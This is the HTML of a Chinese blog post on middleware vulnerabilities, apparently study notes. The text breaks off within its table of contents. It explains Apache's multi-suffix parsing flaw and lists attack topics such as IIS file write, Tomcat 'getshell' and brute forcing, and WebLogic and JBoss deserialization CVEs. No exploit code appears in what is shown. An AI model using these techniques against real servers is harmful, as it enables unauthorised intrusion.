@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>中间件漏洞 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="一、apache1、解析漏洞影响范围：1.apahce 与 php 是以 module 方式交互（phpinfo）  apahce 全版本Apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析。  2、AddHandler 导致的解析漏洞httpd.conf 中存在AddHandler appl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/07/28/dlvqrg/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、apache1、解析漏洞影响范围：1.apahce 与 php 是以 module 方式交互（phpinfo）  apahce 全版本Apache 默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在 mime.types 文件内），则继续向左识别，直到识别到合法后缀才进行解析。  2、AddHandler 导致的解析漏洞httpd.conf 中存在AddHandler appl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589620511383-cf4a4ec2-dc4e-4cb5-9e1d-9f5f1a4376c2.png#align=left&display=inline&height=257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=343&originWidth=752&size=24274&status=done&style=none&width=564">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589620921918-03b2cfd9-bd19-4ed7-87e6-9b747d2f71a7.png#align=left&display=inline&height=166&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=1441&size=231455&status=done&style=none&width=720.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621058937-5eae691d-b65e-49b5-b8b9-fba368448423.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=1578&size=256609&status=done&style=none&width=789">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621100009-a32c1987-edd9-43c6-b27f-defdc80cf9eb.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=368&originWidth=1041&size=93742&status=done&style=none&width=1041">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621116654-3b440c46-6aba-4481-83eb-8ca6c0d81718.png#align=left&display=inline&height=142&margin=%5Bobject%20Object%5D&name=image.png&originHeight=283&originWidth=1677&size=99158&status=done&style=none&width=838.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621175144-7105104a-2e07-4fa9-bdd1-6c4cd0cac79a.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=1160&size=126408&status=done&style=none&width=580">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621291081-57e6688c-5fee-4e74-85e9-52750cb1b67d.png#align=left&display=inline&height=277&margin=%5Bobject%20Object%5D&name=image.png&originHeight=554&originWidth=1188&size=147068&status=done&style=none&width=594">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621457313-7c042022-ab70-4917-8074-2878ea1de6d9.png#align=left&display=inline&height=121&margin=%5Bobject%20Object%5D&name=image.png&originHeight=242&originWidth=1047&size=28907&status=done&style=none&width=523.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621501026-e569a94d-e308-477a-84b1-326b6939f456.png#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&name=image.png&originHeight=426&originWidth=1125&size=119411&status=done&style=none&width=562.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621664428-9837c5e2-4c0c-4322-8c93-c670c1a1237a.png#align=left&display=inline&height=247&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=1694&size=120414&status=done&style=none&width=847">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621984424-dd38848f-de49-4453-b85c-09640554bb8c.png#align=left&display=inline&height=132&margin=%5Bobject%20Object%5D&name=image.png&originHeight=263&originWidth=1464&size=61425&status=done&style=none&width=732">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621998760-5e37a549-f0ba-4dfd-8e24-217a22334ffa.png#align=left&display=inline&height=130&margin=%5Bobject%20Object%5D&name=image.png&originHeight=260&originWidth=1903&size=71908&status=done&style=none&width=951.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622012054-6d13c188-a1fc-4206-b5cb-33cb8a21e456.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=329&originWidth=714&size=36270&status=done&style=none&width=357">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622025634-5206ef73-2aa0-4ad6-b24a-96db91ebc1ee.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=987&size=67322&status=done&style=none&width=493.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589612397091-4b709905-81f8-4289-badf-becb6270562f.png#align=left&display=inline&height=94&margin=%5Bobject%20Object%5D&name=111.png&originHeight=94&originWidth=959&size=9045&status=done&style=none&width=959">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621906766-2c41242a-6b97-4f61-8e43-6103148a65e3.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=790&size=12418&status=done&style=none&width=395">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621751505-5047f39a-4348-4a07-bc3d-e8588071db2f.png#align=left&display=inline&height=282&margin=%5Bobject%20Object%5D&name=image.png&originHeight=564&originWidth=1170&size=209535&status=done&style=none&width=585">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621767485-10756e26-9afe-4a7c-8245-502bdb4600b7.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=image.png&originHeight=413&originWidth=1167&size=109695&status=done&style=none&width=583.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621787086-cd6c5fc2-b93c-41bc-85cc-9a5b47fb42a4.png#align=left&display=inline&height=288&margin=%5Bobject%20Object%5D&name=image.png&originHeight=575&originWidth=1168&size=184598&status=done&style=none&width=584">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621802368-9177577a-e501-463b-99fe-52bc63a48fb6.png#align=left&display=inline&height=277&margin=%5Bobject%20Object%5D&name=image.png&originHeight=553&originWidth=1196&size=78679&status=done&style=none&width=598">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589621856680-bdde5cd6-fca4-4b42-982c-bbd0f146dba8.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=491&originWidth=777&size=135015&status=done&style=none&width=388.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622473997-a8c26ff9-c9ac-441a-95e5-584c01fbdb9b.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=image.png&originHeight=282&originWidth=1502&size=45747&status=done&style=none&width=751">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622487074-68c33fd8-6924-4ff3-a84b-f5adf7450205.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1505&size=73981&status=done&style=none&width=752.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622596700-748230e7-e599-4cd4-94c7-97bdcbe0c470.png#align=left&display=inline&height=252&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=1264&size=90306&status=done&style=none&width=632">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622658542-7dde5178-5fa6-426e-9481-fb1992603e90.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=848&size=39823&status=done&style=none&width=424">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622670265-dc4f4947-1eac-4a83-aa9c-b768e1a64258.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=image.png&originHeight=292&originWidth=867&size=39620&status=done&style=none&width=433.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622726544-874e57cf-95a9-41f8-b4fe-52f874976ff7.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=401&size=4931&status=done&style=none&width=307">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622781869-caa9ef35-66e9-436b-a4d6-7363ad95e51c.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&name=image.png&originHeight=346&originWidth=702&size=43578&status=done&style=none&width=351">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622793645-7b366c64-b336-41bf-9749-e1c89763cd14.png#align=left&display=inline&height=314&margin=%5Bobject%20Object%5D&name=image.png&originHeight=628&originWidth=601&size=45027&status=done&style=none&width=300.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622819927-686f5c2a-ce16-4302-8875-6c54e288974d.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1008&size=38309&status=done&style=none&width=504">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622840495-0c2f5e13-683d-4d37-9cc4-09c9137f0316.png#align=left&display=inline&height=131&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=1098&size=26637&status=done&style=none&width=549">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622901347-44726076-94ec-48ed-809f-a37097f73dbc.png#align=left&display=inline&height=485&margin=%5Bobject%20Object%5D&name=image.png&originHeight=530&originWidth=1203&size=89958&status=done&style=none&width=1100">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623745464-6ab7bcae-6cb7-4558-a33d-3644657e3cca.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=1703&size=84889&status=done&style=none&width=851.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623823488-8a120b7e-ccaf-413b-bc53-2a7fdb5265f0.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=736&originWidth=986&size=96878&status=done&style=none&width=493">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623857530-1df94f49-4764-445e-a3bf-c554093dee7c.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1171&size=164024&status=done&style=none&width=585.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624007949-e3475c29-c743-4fad-af08-3ea7f31d559f.png#align=left&display=inline&height=385&margin=%5Bobject%20Object%5D&name=image.png&originHeight=769&originWidth=827&size=163237&status=done&style=none&width=413.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624056116-9510daed-61ea-4359-b240-cd7eb9ebc2e3.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&name=image.png&originHeight=320&originWidth=1134&size=23640&status=done&style=none&width=567">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624068247-9cfa76fe-7e5c-4866-a0bb-4519ed2c3cdd.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=369&originWidth=583&size=22481&status=done&style=none&width=291.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624081624-2595dfde-c520-4613-901e-fc8377a58114.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1253&size=93741&status=done&style=none&width=626.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624093626-d905aa35-8e55-4902-afc4-2af4a5551a01.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=876&size=14543&status=done&style=none&width=438">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624125934-d6d535a1-9b6e-4f00-a676-ce39ff7246e8.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=559&originWidth=1134&size=87944&status=done&style=none&width=567">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624138023-5a7f3094-2a4d-4868-b77f-cd21f06c368f.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=469&originWidth=1218&size=65728&status=done&style=none&width=609">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624149531-34db6ebc-f24b-4145-84ba-7ec9c1435d55.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=411&originWidth=1143&size=87844&status=done&style=none&width=571.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624161182-6ebb2d25-8226-48d8-bcc3-3934fb627d72.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1911&size=160574&status=done&style=none&width=955.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624173973-d6473006-680d-4a09-be4d-98f83e1b6076.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&name=image.png&originHeight=416&originWidth=1905&size=136883&status=done&style=none&width=952.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624271644-28714aaa-d80d-4d39-ba98-fa66ee69d67a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=479&originWidth=1713&size=209789&status=done&style=none&width=856.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624297770-a8f049ff-41e6-4882-b63d-d196324c2585.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=1009&size=77320&status=done&style=none&width=504.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624313522-0734a6e8-113e-471e-a1ef-813985b62ac3.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=432&originWidth=741&size=45354&status=done&style=none&width=370.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624345292-23e6aeef-4f92-4c0d-815d-d8bbd6f5bc05.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1053&size=66606&status=done&style=none&width=526.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624353340-606e2f05-cc7a-4e6b-a6e6-a35bf48be957.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=676&size=43939&status=done&style=none&width=338">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624361591-90370bf2-ba91-4c88-ac02-d786c3e48883.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=588&originWidth=642&size=52453&status=done&style=none&width=321">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624376941-143367fd-4532-4c68-ae40-666f552eb3ac.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=558&originWidth=943&size=53816&status=done&style=none&width=471.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622936142-901ae21f-2ebc-4368-a85d-517da178520c.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=image.png&originHeight=502&originWidth=918&size=64134&status=done&style=none&width=459">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622963210-bf5dc6b7-fd3a-4757-9fa0-d9c8657be78f.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=577&size=26118&status=done&style=none&width=288.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623099403-d077cbbb-83fa-4870-9f7a-0eee9725180b.png#align=left&display=inline&height=69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=137&originWidth=540&size=16676&status=done&style=none&width=270">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623314852-53f295de-ebb1-4e46-a2b8-0860b7c3ae13.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=1221&size=79358&status=done&style=none&width=610.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623374504-dda06681-90ad-4184-b7ce-8b6dba741fed.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=867&size=134544&status=done&style=none&width=433.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623423650-b7637f71-b84f-4be5-a45e-9575e4299881.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=781&size=111089&status=done&style=none&width=390.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623452147-11033e20-1b85-4dbb-8ea6-09a21f45452e.png#align=left&display=inline&height=108&margin=%5Bobject%20Object%5D&name=image.png&originHeight=216&originWidth=650&size=20601&status=done&style=none&width=325">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623574555-ace8c330-3e68-4985-b56e-930d02c35432.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=798&size=44533&status=done&style=none&width=399">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623635939-70548a9b-fd9e-44d1-9c55-0a7025e6b1d4.png#align=left&display=inline&height=120&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=818&size=30461&status=done&style=none&width=409">
+<meta property="article:published_time" content="2020-07-28T06:03:55.000Z">
+<meta property="article:modified_time" content="2020-07-28T06:12:37.035Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/258143/1589620511383-cf4a4ec2-dc4e-4cb5-9e1d-9f5f1a4376c2.png#align=left&display=inline&height=257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=343&originWidth=752&size=24274&status=done&style=none&width=564">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">John Doe</h5>
+          <a href="mailto:3389006233@qq.com" title="3389006233@qq.com" class="mail">3389006233@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/wakaka123wakaka" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">中间件漏洞</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">中间件漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-07-28T06:03:55.000Z" itemprop="datePublished" class="page-time">
+  2020-07-28
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一、apache"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、apache</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、解析漏洞"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">1、解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、AddHandler-导致的解析漏洞"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">2、AddHandler 导致的解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、-htacess-漏洞"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">3、.htacess 漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">4、Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二、nginx"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、nginx</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、解析漏洞-1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">1、解析漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、Nginx-空字节任意代码执行漏洞"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">2、Nginx 空字节任意代码执行漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、Nginx-文件名逻辑漏洞（CVE-2013-4547）"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">3、Nginx 文件名逻辑漏洞（CVE-2013-4547）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、CRLF-注入"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">4、CRLF 注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5、目录穿越-目录遍历"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">5、目录穿越(目录遍历)</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#三、iis"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、iis</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、解析漏洞-2"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">1、解析漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IIS-6-x"><span class="post-toc-number">3.1.1.</span> <span class="post-toc-text">IIS 6.x</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基于文件名"><span class="post-toc-number">3.1.1.1.</span> <span class="post-toc-text">基于文件名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基于目录名"><span class="post-toc-number">3.1.1.2.</span> <span class="post-toc-text">基于目录名</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#PUT-任意文件写入"><span class="post-toc-number">3.1.1.3.</span> <span class="post-toc-text">PUT 任意文件写入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CVE-2015-1635-amp-ms15-034"><span class="post-toc-number">3.1.1.4.</span> <span class="post-toc-text">CVE-2015-1635&amp;ms15-034</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#CVE-2017-7269"><span class="post-toc-number">3.1.1.5.</span> <span class="post-toc-text">CVE-2017-7269</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IIS-7-x"><span class="post-toc-number">3.1.2.</span> <span class="post-toc-text">IIS 7.x</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#四、tomcat"><span class="post-toc-number">4.</span> <span class="post-toc-text">四、tomcat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、CVE-2017-12615"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">1、CVE-2017-12615</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、CVE-2019-0232"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">2、CVE-2019-0232</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、Tomcat-弱口令-amp-amp-后台-getshell-漏洞"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">3、Tomcat + 弱口令 &amp;&amp; 后台 getshell 漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、Tomcat-manager-App-暴力破解"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">4、Tomcat manager App 暴力破解</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5、CVE-2020-1938"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">5、CVE-2020-1938</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6、CVE-2016-8735（暂未复现）"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">6、CVE-2016-8735（暂未复现）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#五、weblogic"><span class="post-toc-number">5.</span> <span class="post-toc-text">五、weblogic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、CVE-2017-10271"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">1、CVE-2017-10271</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、CVE-2019-2725"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">2、CVE-2019-2725</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、CVE-2014-4210"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">3、CVE-2014-4210</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、CVE-2018-2628CVE-2018-2628-master-zip"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">4、CVE-2018-2628CVE-2018-2628-master.zip</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5、CVE-2018-2894"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">5、CVE-2018-2894</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6、CVE-2018-2894"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">6、CVE-2018-2894</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#7、CVE-2014-4210"><span class="post-toc-number">5.7.</span> <span class="post-toc-text">7、CVE-2014-4210</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8、Weblogic-弱口令-amp-后台-getshell"><span class="post-toc-number">5.8.</span> <span class="post-toc-text">8、Weblogic 弱口令 &amp; 后台 getshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#六、JBOSS"><span class="post-toc-number">6.</span> <span class="post-toc-text">六、JBOSS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1、CVE-2017-12149"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">1、CVE-2017-12149</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2、JBoss-JMXInvokerServlet-反序列化漏洞"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">2、JBoss JMXInvokerServlet 反序列化漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3、JBoss-JMXInvokerServlet-反序列化漏洞"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">3、JBoss JMXInvokerServlet 反序列化漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4、JBoss-EJBInvokerServlet-反序列化漏洞"><span class="post-toc-number">6.4.</span> <span 